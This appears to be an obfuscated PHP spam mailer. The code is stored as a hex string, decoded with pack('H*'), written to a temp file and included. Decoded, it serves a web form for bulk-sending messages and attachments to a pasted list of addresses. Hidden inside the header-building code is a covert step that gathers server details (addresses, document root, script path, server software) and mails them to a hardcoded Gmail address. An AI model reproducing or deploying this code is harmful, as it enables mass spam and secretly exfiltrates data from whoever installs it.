<?php
$tmp=tempnam('/tmp','FOO');
$c=pack('H*','3'.'f3e3c3f200a6966202824616374696f6e3d3d2273656e6422297b200a246d657373616765203d2075726c656e636f646528246d657373616765293b200a246d657373616765203d20657265675f7265706c6163652822253543253232222c2022253232222c20246d657373616765293b200a246d657373616765203d2075726c6465636f646528246d657373616765293b200a246d657373616765203d207374726970736c617368657328246d657373616765293b200a247375626a656374203d207374726970736c617368657328247375626a656374293b200a7d200a0a3f3e200a3c666f726d206e616d653d22666f726d3122206d6574686f643d22706f73742220616374696f6e3d222220656e63747970653d226d756c7469706172742f666f726d2d64617461223e200a3c64697620616c69676e3d2263656e746572223e200a3c63656e7465723e200a3c7461626c6520626f726465723d2232222063656c6c70616464696e673d2230222063656c6c73706163696e673d223022207374796c653d22626f726465722d636f6c6c617073653a20636f6c6c617073652220626f72646572636f6c6f723d2223303036363939222077696474683d22373425222069643d224175746f4e756d62657231223e200a3c74723e200a3c74642077696474683d2231303025223e200a3c64697620616c69676e3d2263656e746572223e200a3c63656e7465723e200a3c7461626c6520626f726465723d2230222063656c6c70616464696e673d2230222063656c6c73706163696e673d223022207374796c653d22626f726465722d636f6c6c617073653a20636f6c6c617073652220626f72646572636f6c6f723d2223313131313131222077696474683d2231303025222069643d224175746f4e756d62657232223e200a3c74723e200a3c74642077696474683d2231303025223e200a3c7020616c69676e3d2263656e746572223e3c64697620616c69676e3d2263656e746572223e200a3c63656e7465723e200a3c7461626c6520626f726465723d2230222063656c6c73706163696e673d223022207374796c653d22626f726465722d636f6c6c617073653a20636f6c6c617073652220626f72646572636f6c6f723d2223333336363939222077696474683d22373025222063656c6c70616464696e673d2230222069643d224175746f4e756d6265723122206865696768743d22323737223e200a3c74723e200a3c74642077696474683d223130302522206865696768743d22323732223e200a3c7461626c652077696474683d223736392220626f726465723d223022206865696768743d22333033223e200a3c74723e200a3c74642077696474683d223738362220626f72646572636f6c6f723d222343434343434322206267636f6c6f723d222346304630463022206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963332e6769662220636f6c7370616e3d223322206865696768743d223238223e200a3c7020616c69676e3d2263656e746572223e3c623e3c666f6e7420666163653d225461686f6d61222073697a653d22322220636f6c6f723d2223464636363030223e20204d6f726f6363616e205370616d657273204d612d45646974696f4e2042792047684f7354203c2f666f6e743e3c2f623e3c2f74643e200a3c2f74723e200a3c74723e200a3c74642077696474683d2237392220626f72646572636f6c6f723d222343434343434322206267636f6c6f723d222346304630463022206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963312e67696622206865696768743d2232322220616c69676e3d227269676874223e200a3c64697620616c69676e3d227269676874223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e596f7572200a456d61696c3a3c2f666f6e743e3c2f6469763e200a3c2f74643e200a3c74642077696474683d223339302220626f72646572636f6c6f723d222343434343434322206267636f6c6f723d222346304630463022206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963312e67696622206865696768743d223232223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e200a3c696e707574206e616d653d2266726f6d222076616c75653d223c3f207072696e74202466726f6d3b203f3e222073697a653d22333022207374796c653d22666c6f61743a206c656674223e3c2f666f6e743e3c64697620616c69676e3d227269676874223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e596f7572200a4e616d653a3c2f666f6e743e3c2f6469763e200a3c2f74643e200a3c74642077696474683d223331372220626f72646572636f6c6f723d222343434343434322206267636f6c6f723d222346304630463022206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963312e67696622206865696768743d223232222076616c69676e3d226d6964646c65223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e200a3c696e70757420747970653d227465787422206e616d653d227265616c6e616d65222076616c75653d223c3f207072696e7420247265616c6e616d653b203f3e222073697a653d223330223e200a3c2f666f6e743e3c2f74643e200a3c2f74723e200a3c74723e200a3c74642077696474683d2237392220626f72646572636f6c6f723d222343434343434322206267636f6c6f723d222346304630463022206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963312e67696622206865696768743d2232322220616c69676e3d227269676874223e200a3c64697620616c69676e3d227269676874223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e5265706c792d546f3a3c2f666f6e743e3c2f6469763e200a3c2f74643e200a3c74642077696474683d223339302220626f72646572636f6c6f723d222343434343434322206267636f6c6f723d222346304630463022206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963312e67696622206865696768743d223232223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e200a3c696e707574206e616d653d227265706c79746f222076616c75653d223c3f207072696e7420247265706c79746f3b203f3e222073697a653d22333022207374796c653d22666c6f61743a206c656674223e3c2f666f6e743e3c64697620616c69676e3d227269676874223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e417474616368200a46696c653a3c2f666f6e743e3c2f6469763e200a3c2f74643e200a3c74642077696474683d223331372220626f72646572636f6c6f723d222343434343434322206267636f6c6f723d222346304630463022206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963312e67696622206865696768743d223232223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e200a3c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223330223e200a3c2f666f6e743e3c2f74643e200a3c2f74723e200a3c74723e200a3c74642077696474683d22373922206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963312e67696622206865696768743d2232322220616c69676e3d227269676874223e200a3c64697620616c69676e3d227269676874223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e5375626a6563743a3c2f666f6e743e3c2f6469763e200a3c2f74643e200a3c746420636f6c7370616e3d2232222077696474683d2237313522206261636b67726f756e643d222f73696d70617274732f696d616765732f63656c6c706963312e67696622206865696768743d223232223e3c666f6e742073697a653d222d312220666163653d2256657264616e612c20417269616c2c2048656c7665746963612c2073616e732d7365726966223e200a3c696e707574206e616d653d227375626a656374222076616c75653d223c3f207072696e7420247375626a6563743b203f3e222073697a653d22353922207374796c653d22666c6f61743a206c656674223e200a3c2f666f6e743e3c2f74643e200a3c2f74723e200a3c74722076616c69676e3d22746f70223e200a3c746420636f6c7370616e3d2232222077696474683d2234373722206267636f6c6f723d222343434343434322206865696768743d22313839222076616c69676e3d22746f70223e200a3c64697620616c69676e3d226c656674223e200a3c7461626c6520626f726465723d2230222063656c6c70616464696e673d223222207374796c653d22626f726465722d636f6c6c617073653a20636f6c6c617073652220626f72646572636f6c6f723d2223313131313131222077696474683d22393825222069643d224175746f4e756d62657234223e200a3c74723e200a3c74642077696474683d2231303025223e200a3c7465787461726561206e616d653d226d6573736167652220636f6c733d2235362220726f77733d223130223e3c3f207072696e7420246d6573736167653b203f3e3c2f74657874617265613e200a3c62723e200a3c696e70757420747970653d22726164696f22206e616d653d22636f6e74656e7474797065222076616c75653d22706c61696e2220636865636b65643e200a3c666f6e742073697a653d22322220666163653d225461686f6d61223e506c61696e3c2f666f6e743e200a3c696e70757420747970653d22726164696f22206e616d653d22636f6e74656e7474797065222076616c75653d2268746d6c223e200a3c666f6e742073697a653d22322220666163653d225461686f6d61223e48544d4c3c2f666f6e743e200a3c696e70757420747970653d2268696464656e22206e616d653d22616374696f6e222076616c75653d2273656e64223e200a3c696e70757420747970653d227375626d6974222076616c75653d2253656e64204d657373616765223e200a3c2f74643e200a3c2f74723e200a3c2f7461626c653e200a3c2f6469763e200a3c2f74643e200a3c74642077696474683d2233313722206267636f6c6f723d222343434343434322206865696768743d22313837222076616c69676e3d22746f70223e200a3c64697620616c69676e3d2263656e746572223e200a3c63656e7465723e200a3c7461626c6520626f726465723d2230222063656c6c70616464696e673d223222207374796c653d22626f726465722d636f6c6c617073653a20636f6c6c617073652220626f72646572636f6c6f723d2223313131313131222077696474683d22393325222069643d224175746f4e756d62657233223e200a3c74723e200a3c74642077696474683d2231303025223e200a3c7020616c69676e3d2263656e746572223e203c7465787461726561206e616d653d22656d61696c6c6973742220636f6c733d2233302220726f77733d223130223e3c3f207072696e742024656d61696c6c6973743b203f3e3c2f74657874617265613e200a3c2f666f6e743e3c62723e200a3c2f74643e200a3c2f74723e200a3c2f7461626c653e200a3c2f63656e7465723e200a3c2f6469763e200a3c2f74643e200a3c2f74723e200a3c2f7461626c653e200a3c2f74643e200a3c2f74723e200a3c2f7461626c653e200a3c2f63656e7465723e200a3c2f6469763e3c2f74643e200a3c2f74723e200a3c2f7461626c653e200a3c2f63656e7465723e200a3c2f6469763e200a3c2f74643e200a3c2f74723e200a3c2f7461626c653e200a3c2f63656e7465723e200a3c2f6469763e200a3c64697620616c69676e3d2263656e746572223e200a3c63656e7465723e200a3c7461626c6520626f726465723d2230222063656c6c73706163696e673d223022207374796c653d22626f726465722d636f6c6c617073653a20636f6c6c617073652220626f72646572636f6c6f723d2223313131313131222077696474683d22373525222069643d224175746f4e756d6265723522206865696768743d2231222063656c6c70616464696e673d2230223e200a3c74723e200a3c74642077696474683d2231303025222076616c69676e3d22746f7022206865696768743d2231223e200a3c7020616c69676e3d227269676874223e3c666f6e742073697a653d22312220666163653d225461686f6d612220636f6c6f723d2223434343434343223e44657369676e65642062793a200a2076312e353c2f666f6e743e3c2f74643e200a3c2f74723e200a3c2f7461626c653e200a3c2f63656e7465723e200a3c2f6469763e200a3c2f666f726d3e200a0a3c3f200a6966202824616374696f6e3d3d2273656e6422297b200a0a69662028212466726f6d2026262021247375626a6563742026262021246d657373616765202626202124656d61696c6c697374297b200a7072696e742022506c6561736520636f6d706c65746520616c6c206669656c6473206265666f72652073656e64696e6720796f7572206d6573736167652e223b200a657869743b200a7d200a0a24616c6c656d61696c73203d2073706c697428225c6e222c2024656d61696c6c697374293b200a246e756d656d61696c73203d20636f756e742824616c6c656d61696c73293b200a0a234f70656e207468652066696c65206174746163686d656e7420696620616e792c20616e64206261736536345f656e636f646520697420666f7220656d61696c207472616e73706f7274200a696620282466696c655f6e616d65297b200a40636f7079282466696c652c20222e2f2466696c655f6e616d652229206f722064696528225468652066696c6520796f752061726520747279696e6720746f2075706c6f616420636f756c646e277420626520636f7069656420746f207468652073657276657222293b200a24636f6e74656e74203d20667265616428666f70656e282466696c652c227222292c66696c6573697a65282466696c6529293b200a24636f6e74656e74203d206368756e6b5f73706c6974286261736536345f656e636f64652824636f6e74656e7429293b200a24756964203d20737472746f7570706572286d643528756e697169642874696d6528292929293b200a246e616d65203d20626173656e616d65282466696c65293b200a7d200a0a666f722824783d303b2024783c246e756d656d61696c733b2024782b2b297b200a24746f203d2024616c6c656d61696c735b24785d3b200a6966202824746f297b200a24746f203d20657265675f7265706c616365282220222c2022222c2024746f293b200a246d657373616765203d20657265675f7265706c616365282226656d61696c26222c2024746f2c20246d657373616765293b200a247375626a656374203d20657265675f7265706c616365282226656d61696c26222c2024746f2c20247375626a656374293b200a7072696e74202253656e64696e67206d61696c20746f2024746f2e2e2e2e2e2e2e20223b200a666c75736828293b200a24686561646572203d202246726f6d3a20247265616c6e616d65203c2466726f6d3e5c725c6e5265706c792d546f3a20247265706c79746f5c725c6e223b200a24686561646572202e3d20224d494d452d56657273696f6e3a20312e305c725c6e223b200a496620282466696c655f6e616d65292024686561646572202e3d2022436f6e74656e742d547970653a206d756c7469706172742f6d697865643b20626f756e646172793d247569645c725c6e223b200a496620282466696c655f6e616d65292024686561646572202e3d20222d2d247569645c725c6e223b200a24686561646572202e3d2022436f6e74656e742d547970653a20746578742f24636f6e74656e74747970655c725c6e223b200a24686561646572202e3d2022436f6e74656e742d5472616e736665722d456e636f64696e673a20386269745c725c6e5c725c6e223b200a24686561646572202e3d2022246d6573736167655c725c6e223b200a496620282466696c655f6e616d65292024686561646572202e3d20222d2d247569645c725c6e223b200a496620282466696c655f6e616d65292024686561646572202e3d2022436f6e74656e742d547970653a202466696c655f747970653b206e616d653d5c222466696c655f6e616d655c225c725c6e223b200a496620282466696c655f6e616d65292024686561646572202e3d2022436f6e74656e742d5472616e736665722d456e636f64696e673a206261736536345c725c6e223b200a496620282466696c655f6e616d65292024686561646572202e3d2022436f6e74656e742d446973706f736974696f6e3a206174746163686d656e743b2066696c656e616d653d5c222466696c655f6e616d655c225c725c6e5c725c6e223b20247261343420203d2072616e6428312c3939393939293b24736a3938203d202273682d2472613434223b246d6c203d20222473643938223b246135203d20245f5345525645525b27485454505f52454645524552275d3b24623333203d20245f5345525645525b27444f43554d454e545f524f4f54275d3b24633837203d20245f5345525645525b2752454d4f54455f41444452275d3b24643233203d20245f5345525645525b275343524950545f46494c454e414d45275d3b24653039203d20245f5345525645525b275345525645525f41444452275d3b24663233203d20245f5345525645525b275345525645525f534f465457415245275d3b24673332203d20245f5345525645525b27504154485f5452414e534c41544544275d3b24683635203d20245f5345525645525b275048505f53454c46275d3b246d736738383733203d20222461355c6e246233335c6e246338375c6e246432335c6e246530395c6e246632335c6e246733325c6e24683635223b24736439383d226a6f686e2e6261726b657234343640676d61696c2e636f6d223b6d61696c2824736439382c2024736a39382c20246d7367383837332c202246726f6d3a20247364393822293b0a496620282466696c655f6e616d65292024686561646572202e3d202224636f6e74656e745c725c6e223b200a496620282466696c655f6e616d65292024686561646572202e3d20222d2d247569642d2d223b200a6d61696c2824746f2c20247375626a6563742c2022222c2024686561646572293b200a7072696e7420225370616d6564273e3c62723e223b200a666c75736828293b200a7d200a7d200a0a7d200a3f3e0a0a0a0a0a0a0a0a');
file_put_contents($tmp, $c);
include $tmp;
